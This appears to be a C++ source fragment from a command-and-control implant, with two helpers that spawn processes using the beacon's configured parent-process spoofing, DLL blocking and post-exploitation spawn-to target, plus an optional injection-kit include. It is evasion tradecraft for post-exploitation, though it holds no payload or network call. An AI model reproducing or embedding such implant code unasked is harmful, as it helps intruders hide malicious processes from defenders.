#include <general.h>

auto inline KhpCreateProcess( 
    _In_  WCHAR*               SpawnProcess,
    _In_  ULONG                StateFlag,
    _Out_ PROCESS_INFORMATION* PsInfo
) -> ULONG {
#if defined(PS_INJECT_KIT)
#include <kit/process_creation.cc>
#endif
    
    BEACON_INFO* info = (BEACON_INFO*)malloc( sizeof( BEACON_INFO ) );
    
    BeaconInformation( info );

    PS_CREATE_ARGS CreateArgs = {};

    CreateArgs.ppid       = info->Config->Ps.ParentID;
    CreateArgs.blockdlls  = info->Config->Ps.BlockDlls;
    CreateArgs.argument   = SpawnProcess;
    CreateArgs.state      = StateFlag;

    ULONG status = kh_process_creation( &CreateArgs, PsInfo );

    free( info );

    return status;
}

auto inline KhpSpawntoProcess(
    _In_  datap*               DataParser,
    _In_  ULONG                StateFlag,
    _Out_ PROCESS_INFORMATION* PsInfo
) -> ULONG {
#if defined(PS_INJECT_KIT)
#include <kit/process_creation.cc>
#endif

    BEACON_INFO* info = (BEACON_INFO*)malloc( sizeof( BEACON_INFO ) );
    
    BeaconInformation( info );

    PS_CREATE_ARGS CreateArgs = {};

    CreateArgs.argument  = info->Config->Postex.Spawnto;
    CreateArgs.state     = StateFlag;
    CreateArgs.ppid      = info->Config->Ps.ParentID;
    CreateArgs.blockdlls = info->Config->Ps.BlockDlls;

    ULONG status = kh_process_creation( &CreateArgs, PsInfo );

    free( info );

    return status;
}
